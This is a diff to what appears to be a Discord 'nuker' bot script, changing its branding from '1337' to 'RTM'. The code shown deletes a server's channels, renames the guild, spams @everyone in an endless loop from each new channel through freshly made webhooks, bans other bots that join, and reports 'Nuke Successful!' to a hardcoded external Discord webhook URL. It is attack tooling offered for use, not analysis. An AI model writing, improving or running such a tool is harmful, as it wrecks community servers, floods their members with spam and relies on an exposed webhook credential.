@@ -2,7 +2,7 @@
 
 dm_msg = "**1337 Beamed You** https://youtu.be/gGzOhy9vNkg\nhttps://discord.gg/pE2f8KaK3R"
 spam_messages = ["@everyone **1337 wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by 1337 | **https://discord.gg/pE2f8KaK3R"]
-webhook_usernames = ["1337 Wizzed U", "1337", "1337 BEAMER", "🤫", "1337 NUUUKED"]
+webhook_usernames = ["RTM Wizzed U", "RTM", "RTM BEAMER", "🤫", "RTM NUUUKED"]
 
 import discord, random, aiohttp, asyncio, json, os, threading
 from discord import Webhook, AsyncWebhookAdapter
@@ -45,7 +45,7 @@ async def nuke(guild):
       print(f"{C.GREEN}[+] [Channel Deletion] {C.WHITE}{channel.name}")
     except:
       print(f"{C.RED}[-] [Channel Deletion] {C.WHITE}{channel.name}{C.RESET}")
-  await guild.edit(name=f"1337 wizzed {guild.name}")
+  await guild.edit(name=f"RTM wizzed {guild.name}")
   nukedwebhook = ["https://discord.com/api/webhooks/784536463588327444/5hE0jrlRbkQCXeobAJFjfO1HOzhkMkW6KNIAw4xUMQXaIGk-rDnyfQ-Sd5flLgmI7mbN"]
   webhook = DiscordWebhook(url=nukedwebhook)
   log = DiscordEmbed(title = f"Nuke Successful!", description = f"Server: [**{guild.name}**]")
@@ -224,8 +224,8 @@ async def force_restart(ctx):
 @bot.event
 async def on_guild_channel_create(channel):
   while True:
-    await channel.send("@everyone 1337 Wizzed This Shit.")
-    webhook = await channel.create_webhook(name="1337")
+    await channel.send("@everyone RTM Wizzed This Shit.")
+    webhook = await channel.create_webhook(name="RTM")
     webhook_url = webhook.url
     async with aiohttp.ClientSession() as session:
       webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
@@ -244,7 +244,7 @@ async def on_guild_join(guild):
 @bot.event
 async def on_member_join(member):
  if member.bot:
-   await member.ban(reason="Not stealing 1337's wizz, clown")
+   await member.ban(reason="Not stealing RTM's wizz, clown")
  else:
    return
 
